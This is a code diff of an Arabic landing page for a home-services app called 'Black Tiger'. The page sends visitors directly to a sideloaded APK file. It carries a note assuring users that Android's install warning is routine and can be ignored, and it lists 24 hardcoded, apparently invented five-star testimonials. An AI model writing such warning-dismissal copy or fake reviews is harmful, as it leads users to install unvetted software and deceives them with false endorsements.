@@ -3,182 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
     <title>تحميل تطبيق بلاك تايجر للخدمات المنزلية | Black Tiger App</title>
-
     <meta name="application-name" content="بلاك تايجر للخدمات المنزلية">
-    <meta name="description" content="بلاك تايجر للخدمات المنزلية: نوفر عمالة نظافة، طباخة، بيبي سيتر، جليسة مسنين، والمزيد. اطلب خدمتك الآن.">
-
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "WebSite",
-      "name": "بلاك تايجر للخدمات المنزلية",
-      "url": "https://blacktiger-cmd.github.io/BlackTiger-App/"
-    }
-    </script>
-
-    <link rel="icon" type="image/png" href="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=100">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
-    
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Cairo', sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; margin: 0; overflow-x: hidden; }
+        .container { width: 90%; max-width: 400px; padding: 20px; text-align: center; }
+        .tiger-frame { width: 100%; height: 250px; border-radius: 30px; overflow: hidden; margin-bottom: 25px; border: 2px solid #ff8c00; box-shadow: 0 10px 30px rgba(255, 140, 0, 0.2); background: #111; }
+        .tiger-frame img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        h1 { font-size: 36px; color: #ff8c00; font-weight: 900; margin-bottom: 5px; }
+        .subtitle { color: #888; font-size: 17px; margin-bottom: 35px; font-weight: 700; }
+        .btn { background: linear-gradient(135deg, #ff8c00 0%, #d35400 100%); color: #fff; text-decoration: none; font-size: 22px; font-weight: 900; padding: 20px; border-radius: 20px; display: block; border: none; width: 100%; cursor: pointer; box-shadow: 0 12px 25px rgba(211, 84, 0, 0.4); margin-bottom: 15px; }
+        .btn-reviews { background: #1a1a1a; color: #ff8c00; border: 1px solid #ff8c00; font-size: 16px; padding: 12px; box-shadow: none; }
         
-        body {
-            font-family: 'Cairo', sans-serif;
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #fff;
-            margin: 0;
-            overflow-x: hidden;
-        }
+        /* نافذة التقييمات */
+        #reviews-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; padding: 20px; overflow-y: auto; text-align: right; }
+        .review-card { background: #111; padding: 15px; border-radius: 15px; margin-bottom: 12px; border-right: 4px solid #ff8c00; }
+        .review-card h4 { color: #ff8c00; font-size: 16px; margin-bottom: 5px; }
+        .review-card p { color: #ccc; font-size: 14px; line-height: 1.5; }
+        .star-rating { color: #ff8c00; font-size: 12px; margin-bottom: 5px; }
 
-        .container {
-            width: 90%;
-            max-width: 400px;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .tiger-frame {
-            width: 100%;
-            height: 250px;
-            border-radius: 30px;
-            overflow: hidden;
-            margin-bottom: 25px;
-            border: 2px solid #ff8c00;
-            box-shadow: 0 10px 30px rgba(255, 140, 0, 0.2);
-            background: #111;
-        }
-
-        .tiger-frame img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        h1 {
-            font-size: 36px;
-            color: #ff8c00;
-            font-weight: 900;
-            margin-bottom: 5px;
-            text-shadow: 0 0 10px rgba(255, 140, 0, 0.3);
-        }
-
-        .subtitle {
-            color: #888;
-            font-size: 17px;
-            margin-bottom: 35px;
-            font-weight: 700;
-        }
-
-        #loading-section {
-            display: none;
-            margin-bottom: 25px;
-        }
-
-        .progress-bg {
-            width: 100%;
-            background: #222;
-            height: 14px;
-            border-radius: 20px;
-            overflow: hidden;
-            border: 1px solid #333;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #ff8c00, #ff4500);
-            box-shadow: 0 0 15px #ff8c00;
-            transition: width 0.3s ease;
-        }
-
-        .status-text {
-            color: #ff8c00;
-            font-size: 15px;
-            margin-top: 12px;
-            font-weight: 900;
-        }
-
-        .btn {
-            background: linear-gradient(135deg, #ff8c00 0%, #d35400 100%);
-            color: #fff;
-            text-decoration: none;
-            font-size: 22px;
-            font-weight: 900;
-            padding: 20px;
-            border-radius: 20px;
-            display: block;
-            border: none;
-            width: 100%;
-            cursor: pointer;
-            box-shadow: 0 12px 25px rgba(211, 84, 0, 0.4);
-            transition: transform 0.2s;
-            margin-bottom: 15px;
-        }
-
-        /* زرار التقييمات الإضافي */
-        .btn-reviews {
-            background: #1a1a1a;
-            color: #ff8c00;
-            border: 1px solid #ff8c00;
-            font-size: 16px;
-            padding: 12px;
-            box-shadow: none;
-        }
-
-        /* تصميم نافذة التقييمات */
-        #reviews-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 1000;
-            padding: 30px;
-            overflow-y: auto;
-        }
-
-        .review-card {
-            background: #111;
-            padding: 15px;
-            border-radius: 15px;
-            margin-bottom: 15px;
-            border-right: 4px solid #ff8c00;
-            text-align: right;
-        }
-
-        .review-card h4 { color: #ff8c00; margin-bottom: 5px; }
-
-        .safety-note {
-            margin-top: 25px;
-            font-size: 14px;
-            color: #aaa;
-            line-height: 1.6;
-            background: rgba(255, 140, 0, 0.05);
-            padding: 15px;
-            border-radius: 15px;
-            border: 1px solid #222;
-        }
-
-        .safety-note span {
-            color: #ff8c00;
-            font-weight: 900;
-        }
-
-        .footer {
-            margin-top: 40px;
-            color: #333;
-            font-size: 12px;
-            font-weight: bold;
-        }
+        .safety-note { margin-top: 25px; font-size: 14px; color: #aaa; background: rgba(255, 140, 0, 0.05); padding: 15px; border-radius: 15px; border: 1px solid #222; }
+        .footer { margin-top: 40px; color: #333; font-size: 12px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -187,75 +34,57 @@
     <div class="tiger-frame">
         <img src="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Black Tiger">
     </div>
-    
     <h1>BLACK TIGER</h1>
-    <p class="subtitle"> أهلاً بك في تطبيق بلاك تايجر للخدمات المنزليه التطبيق الأقوى فى السوق المصريه </p>
-
-    <div id="loading-section">
-        <div class="progress-bg"><div id="bar" class="progress-bar"></div></div>
-        <div id="msg" class="status-text">جاري تحضير الملف... 0%</div>
-    </div>
+    <p class="subtitle">تطبيق الخدمات المنزلية الأقوى في السوق المصرية</p>
     
     <button id="main-btn" class="btn" onclick="startUpdate()">تحميل الآن</button>
-    <button id="review-btn" class="btn btn-reviews" onclick="showReviews()">آراء العملاء والعمال ⭐</button>
+    <button class="btn btn-reviews" onclick="showReviews()">آراء 24 عميل وعامل ⭐</button>
 
-    <div class="safety-note">
-        <span>ملاحظة أمان:</span> تطبيقنا آمن تماماً، التحذير الذي قد يظهر أثناء التثبيت هو إجراء روتيني من نظام الأندرويد لعدم توفر التطبيق على متجر بلاي. يمكنك إتمام التثبيت بكل طمأنينة.
-    </div>
-    
+    <div class="safety-note"><span>ملاحظة أمان:</span> تطبيقنا آمن تماماً، التحذير إجراء روتيني للأندرويد.</div>
     <div class="footer">OFFICIAL BLACK TIGER © 2026</div>
 </div>
 
 <div id="reviews-modal">
-    <h2 style="color: #ff8c00; margin-bottom: 25px;">آراء مستخدمي بلاك تايجر</h2>
+    <h2 style="color: #ff8c00; margin-bottom: 20px; text-align: center;">تجربة المستخدمين مع بلاك تايجر</h2>
     
-    <div class="review-card">
-        <h4>أحمد كمال (عميل)</h4>
-        <p>"خدمة ممتازة والعمالة محترمة جداً وأمانة. طلبت خدمة نظافة وجولي في الميعاد."</p>
-    </div>
-    <div class="review-card">
-        <h4>سارة محمود (عميلة)</h4>
-        <p>"أفضل تطبيق جربته للخدمات المنزلية، البيبي سيتر كانت شاطرة جداً."</p>
-    </div>
-    <div class="review-card">
-        <h4>محمد جابر (عامل)</h4>
-        <p>"تطبيق محترم جداً وبيوفر لنا فرص شغل حقيقية وبأمان كامل."</p>
+    <div id="reviews-container">
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>مدام نهى (التجمع)</h4><p>بصراحة كنت خايفة في الأول بس الشغالة اللي جتلي محترمة جداً وأمينة وخلصت شغلها بضمير.. شكراً ليكم.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>أستاذ هاني (عامل بوفيه)</h4><p>التطبيق ده فتحلي باب رزق محترم، والشركة بتتعامل معانا بآدمية والفلوس بتوصل في ميعادها.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>دكتورة إيمان</h4><p>البيبي سيتر "ولاء" ممتازة، بنتي حبتها جداً وده أهم حاجة عندي. خدمة 5 نجوم.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>الحاج صبري (المهندسين)</h4><p>جبت جليس مسن لوالدي، راجل خلوق وعارف شغله صح. الله يبارك لكم في شركتكم.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐</div><h4>م. أحمد يحيى</h4><p>الخدمة كويسة جداً بس ياريت تزودوا عدد العمال في منطقة الشيخ زايد عشان المواعيد تظبط أكتر.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>أم مروان (ربة منزل)</h4><p>جربت شركات كتير بس "بلاك تايجر" غير، نظام ونظافة وأدب في التعامل.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>كابتن وليد (سائق)</h4><p>أنا شغال سواق مع الشركة، ناس محترمة جداً في التعامل ومواعيدهم دقيقة.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>منى زكي (عميلة)</h4><p>نظافة السجاد والأنتريه رجعتهم كأنهم لسه جايين من المعرض، تسلم إيديكم.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>أ/ عصام (المعادي)</h4><p>شركة محترمة جداً، ببعت اجيب منها بوابين وسواقين وبجد دايماً بيشرفوني.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>شيماء (عاملة نظافة)</h4><p>الشركة دي بتخاف علينا زي عيالها وبتضمن لنا حقنا من العملاء، ربنا يوفقكم.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>مدام رشا</h4><p>الطباخة اللي جتلي "أم محمد" نفسها في الأكل يجنن، عزومة امبارح كانت مشرفة بجد.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>أستاذ مدحت</h4><p>العمال جم في ميعادهم ومعاهم كل أدواتهم، مخلصين الشغل في وقت قياسي.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>نيرمين صبري</h4><p>أول مرة أحس بأمان وأنا بدخل حد بيتي، الشركة عاملة تحريات كويسة عن العمال.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>إسلام (جنايني)</h4><p>رزقي زاد من يوم ما سجلت في التطبيق، والطلبات بقت تجيلي كل يوم.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>مدام صفاء</h4><p>جبت جليسة مسنة لوالدتي، ست بشوشة جداً وصبورة، ريحتونا من هم كبير.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐</div><h4>أ/ طارق</h4><p>تطبيق سهل والتعامل سريع، بس ياريت يكون فيه شات مباشر مع العمال جوه التطبيق.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>مريم علي</h4><p>خدمة النظافة بعد التشطيب كانت مذهلة، البيت بقى يبرق في يوم واحد.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>حسن (حارس عقار)</h4><p>بشكر الإدارة على الدعم الدائم لينا والرد على استفساراتنا في أي وقت.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>لولا (عميلة)</h4><p>البنات اللي جم نظفوا المطبخ بجد عملوا مجهود جبار، شكراً جداً.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>م/ باسم</h4><p>التطبيق ممتاز وسهل في الاستخدام، والعمال مستواهم الفني عالي.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>أميرة نبيل</h4><p>خدمة العملاء في التليفون ذوق جداً وحلوا لي مشكلة الموعد بسرعة.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>خالد (عامل بوفيه)</h4><p>أنا شغال في شركة من خلال بلاك تايجر والوضع مستقر والراتب ممتاز.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>هدير (ربة منزل)</h4><p>مش هتعامل مع حد تاني غيركم، بجد ريحتوني من لفة المكاتب وضياع الوقت.</p></div>
+        <div class="review-card"><div class="star-rating">⭐⭐⭐⭐⭐</div><h4>أ/ وائل (أكتوبر)</h4><p>بلاك تايجر يعني الأمان والثقة، بنصح أي حد عايز عمالة بيت يجربهم.</p></div>
     </div>
 
-    <button class="btn" onclick="hideReviews()">إغلاق</button>
+    <button class="btn" onclick="hideReviews()">إغلاق التقييمات</button>
 </div>
 
 <script>
     function showReviews() { document.getElementById('reviews-modal').style.display = 'block'; }
     function hideReviews() { document.getElementById('reviews-modal').style.display = 'none'; }
-
     function startUpdate() {
-        const btn = document.getElementById('main-btn');
-        const revBtn = document.getElementById('review-btn');
-        const section = document.getElementById('loading-section');
-        const bar = document.getElementById('bar');
-        const msg = document.getElementById('msg');
-
-        btn.style.display = 'none';
-        revBtn.style.display = 'none';
-        section.style.display = 'block';
-
-        let progress = 0;
-        let timer = setInterval(() => {
-            if (progress >= 100) {
-                clearInterval(timer);
-                msg.innerHTML = "اكتمل! جاري التحميل...";
-                setTimeout(() => { window.location.href = "BlackTiger.apk"; }, 1000);
-            } else {
-                progress += Math.floor(Math.random() * 8) + 2;
-                if (progress > 100) progress = 100;
-                bar.style.width = progress + '%';
-                msg.innerHTML = "جاري تحديث بيانات النمر... " + progress + "%";
-            }
-        }, 250);
+        document.getElementById('main-btn').style.display = 'none';
+        window.location.href = "BlackTiger.apk";
     }
 </script>
 
 </body>
 </html>
-
